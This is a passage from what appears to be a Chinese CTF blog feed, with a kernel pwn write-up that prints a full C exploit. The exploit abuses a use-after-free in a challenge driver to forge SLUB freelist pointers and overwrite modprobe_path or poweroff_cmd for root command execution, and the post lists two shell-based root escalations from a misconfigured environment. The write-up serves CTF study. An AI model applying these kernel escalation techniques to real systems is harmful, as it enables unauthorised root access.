class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] = &#123;</span></span><br><span class="line">LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),</span><br><span class="line">LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这才发现没有<code>__lsm_ro_after_init</code>，所以是可以改的。<br>那么意味着新版内核这个方法应该不再适用了。</p></blockquote><p>在本题中，我们通过任意地址写，可以修改<code>modprobe_path</code>，然后执行错误格式文件触发任意命令执行；也可以修改<code>poweroff_cmd</code>，然后再次利用<code>seq_operations-&gt;start</code>为<code>orderly_poweroff</code>来触发。</p><p><strong>最后一个坑；</strong></p><blockquote><p>实现对全局变量的修改之后，由于我们在用户空间布置了一块内存，如果不同时把这个用户空间伪造的object给分配出来的话，极大的概率会crash。<br>这是由于内核中跑了两个线程，如果另一个线程在<code>kmalloc</code>的时候尝试分配这个伪造的object，会因为在这个线程里不存在我们exp线程中<code>mmap</code>出来的内存，而触发page fault。<br>所以只要在exp中继续把这个用户空间伪造的object给拿掉，后续的<code>kmalloc</code>就会从新的page里拿而不会导致crash了。</p></blockquote><p>提供以下exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_CMD  0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEL_CMD  0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_CMD 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_CMD 0x30003</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> *buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="built_in">size</span>;</span><br><span class="line">&#125; arg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, ADD_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> *buf, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, EDIT_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> *buf, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, SHOW_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, DEL_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/dev/noob"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// three objects used to leak</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x50</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>); <span class="comment">// freelist: pool[1].ptr ==&gt; pool[0].ptr ==&gt; ...</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x50</span>); <span class="comment">// pool[3].ptr-&gt;fd = pool[0].ptr ^ pool[1].ptr ^ random</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">2</span>); <span class="comment">// freelist: pool[2].ptr ==&gt; pool[0].ptr ==&gt; ...</span></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x50</span>); <span class="comment">// pool[3].ptr-&gt;fd = pool[0].ptr ^ pool[2].ptr ^ random</span></span><br><span class="line"></span><br><span class="line">    show(<span class="number">3</span>, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> value_0_1 = buf[<span class="number">0</span>];</span><br><span class="line">    show(<span class="number">4</span>, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> value_0_2 = buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">4</span>); <span class="comment">// freelist: pool[4].ptr(pool[2].ptr) ==&gt; pool[3].ptr(pool[1].ptr) ==&gt; pool[0].ptr ==&gt; ...</span></span><br><span class="line">               <span class="comment">// pool[4].ptr-&gt;fd = ool[4].ptr(pool[2].ptr) ^ pool[3].ptr(pool[1].ptr) ^ random</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate random</span></span><br><span class="line">    show(<span class="number">4</span>, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> value_1_2 = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="built_in">random</span> = value_0_1 ^ value_0_2 ^ value_1_2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] random value: %p\n"</span>, <span class="built_in">random</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// map a userspace memory to leak low 4 bytes of the slub object address</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *tmp_chunk = mmap(<span class="number">0x5000000</span>, <span class="number">0x2000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(tmp_chunk != <span class="number">0x5000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uaf, let the next freed object stays at userspace memory(in tmp_chunk)</span></span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">5</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="built_in">random</span> ^ (<span class="number">0xffff8800</span>ull &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    edit(<span class="number">5</span>, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let all fd = 0 </span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x2000000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_chunk[i] = <span class="built_in">random</span> ^ (<span class="keyword">uint64_t</span>)(&amp;tmp_chunk[i]); <span class="comment">// let fd = 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x50</span>); <span class="comment">// victim object</span></span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x50</span>); <span class="comment">// userspace object</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak object address</span></span><br><span class="line">    <span class="keyword">uint64_t</span> victim_object;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0xdeadbeefdeadbeef</span>; <span class="comment">// write a label value</span></span><br><span class="line">    edit(<span class="number">7</span>, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x2000000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp_chunk[i] == <span class="number">0xdeadbeefdeadbeef</span>) <span class="comment">// search the label value</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim_object = (<span class="number">0xffff8800</span>ull &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint64_t</span>)&amp;tmp_chunk[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] the object address is %p\n"</span>, victim_object); <span class="comment">//the address of pool[6].ptr</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// avoid crash</span></span><br><span class="line">    <span class="keyword">uint32_t</span> userspace = (<span class="built_in">random</span> &gt;&gt; <span class="number">32</span>) ^ <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> *tmp_buf = mmap(userspace &amp; <span class="number">0xfffff000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(tmp_chunk != userspace &amp; <span class="number">0xfffff000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] mmap at %p\n"</span>, userspace &amp; <span class="number">0xfffff000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)userspace = <span class="built_in">random</span> ^ userspace; <span class="comment">// let fd = 0;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">6</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="built_in">random</span> ^ victim_object ^ userspace; <span class="comment">// let fd = userspace</span></span><br><span class="line">    edit(<span class="number">6</span>, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x50</span>);</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x50</span>); <span class="comment">// target address (userspace)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// avoid crash</span></span><br><span class="line">    userspace = (<span class="built_in">random</span> ^ <span class="number">0xc000454c</span>) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> *bypass_buf = mmap(userspace &amp; <span class="number">0xfffff000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(bypass_buf != userspace &amp; <span class="number">0xfffff000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] mmap at %p\n"</span>, userspace &amp; <span class="number">0xfffff000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)userspace = <span class="built_in">random</span> ^ userspace; <span class="comment">// let fd = 0;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">6</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="built_in">random</span> ^ victim_object ^ <span class="number">0xffffffffc000454c</span>; <span class="comment">// let fd = 0xffffffffc000454c(in pool area)</span></span><br><span class="line">    edit(<span class="number">6</span>, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0x50</span>);</span><br><span class="line">    add(<span class="number">11</span>, <span class="number">0x50</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// avoid crash</span></span><br><span class="line">    add(<span class="number">0x1f</span>, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> USE_MODPROBE_PATH</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *buf_offset = (<span class="keyword">uint8_t</span> *)buf + <span class="number">4</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf_offset[<span class="number">0</span>] = <span class="number">0xffffffff8245aba0</span>; <span class="comment">// let pool[9] = &amp;modprobe_path</span></span><br><span class="line">    edit(<span class="number">11</span>, buf, <span class="number">0xc</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// modprobe_path[] = "/getflag"</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"/getflag"</span>);</span><br><span class="line">    edit(<span class="number">9</span>, buf, <span class="built_in">strlen</span>(<span class="string">"/getflag"</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo '#!/bin/sh \nchmod 777 /flag' &gt; /getflag"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /getflag"</span>);</span><br><span class="line">    system(<span class="string">"echo -n '\xFF\xFF\xFF\xFF' &gt; /fake_elf"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /fake_elf"</span>);</span><br><span class="line">    system(<span class="string">"/fake_elf"</span>); <span class="comment">// trigger call_modprobe()</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">uint64_t</span> *buf_offset = (<span class="keyword">uint8_t</span> *)buf + <span class="number">4</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf_offset[<span class="number">0</span>] = <span class="number">0xffffffff8245a400</span>; <span class="comment">// let pool[9] = &amp;poweroff_cmd</span></span><br><span class="line">    edit(<span class="number">11</span>, buf, <span class="number">0xc</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"/bin/chmod 777 /flag"</span>);</span><br><span class="line">    edit(<span class="number">9</span>, buf, <span class="built_in">strlen</span>(<span class="string">"/bin/chmod 777 /flag"</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0x11</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0x11</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create seq_operations(0x20)</span></span><br><span class="line">    <span class="keyword">int</span> seq_fd = <span class="built_in">open</span>(<span class="string">"/proc/self/stat"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0xffffffff810adbf0</span>; <span class="comment">// seq_operations-&gt;start = orderly_poweroff</span></span><br><span class="line">    edit(<span class="number">0x10</span>, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(seq_fd, buf, <span class="number">1</span>); <span class="comment">// call seq_operations-&gt;start</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="bonus"><a href="#bonus" class="headerlink" title="bonus"></a>bonus</h1><p>这题貌似环境没有配置好，导致各种非预期满天飞，抛开直接strings的和直接从给的本地环境中直接读到的不谈，这里有两个比较有意思的，都是因为所有文件的owner都是pwn而不是root：</p><ol><li><code>rm /sbin/poweroff</code>然后直接<code>exit</code>，由于启动脚本<code>etc/init.d/rcS</code>里： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo "Welcome :)"</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/noob.ko</span><br><span class="line">chmod 666 /dev/noob</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure> 退出最后会执行<code>poweroff</code>，如果没找到<code>/sbin/poweroff</code>自然报错执行不了，这个时候就会得到root权限。</li><li>同样地<code>rm /bin/umount</code>，然后自己写一个”/bin/sh”仍里面，<code>exit</code>同样会执行<code>umount</code>命令，从而直接拿到root权限。<br>不过看看就好，一般来说不会出现这样的失误。</li></ol><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li><a href="https://ctf-wiki.org/pwn/linux/kernel/double-fetch/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/kernel/double-fetch/</a></li><li><a href="https://hitworld.github.io/posts/1b3982a0/" target="_blank" rel="noopener">https://hitworld.github.io/posts/1b3982a0/</a></li><li><a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628" target="_blank" rel="noopener">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></li><li><a href="https://www.jianshu.com/p/1aaabff03d60" target="_blank" rel="noopener">https://www.jianshu.com/p/1aaabff03d60</a></li><li><a href="https://www.anquanke.com/post/id/200161#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200161#h2-4</a></li><li><a href="https://www.jianshu.com/p/cb7d56510080" target="_blank" rel="noopener">https://www.jianshu.com/p/cb7d56510080</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿去年高校战疫分享赛的一道kernel pwn题作为小白鼠，尝试多种内核利用方法，也踩了不少坑。不过还是学到了不少东西。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.com/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>AntCTFxD^3CTF pwn 分析</title>
    <link href="https://n0nop.com/2021/03/28/AntCTFxD-3CTF-pwn-%E5%88%86%E6%9E%90/"/>
    <id>https://n0nop.com/2021/03/28/AntCTFxD-3CTF-pwn-%E5%88%86%E6%9E%90/</id>
    <published>2021-03-28T14:17:10.000Z</published>
    <updated>2021-03-28T14:19:44.886Z</updated>
    
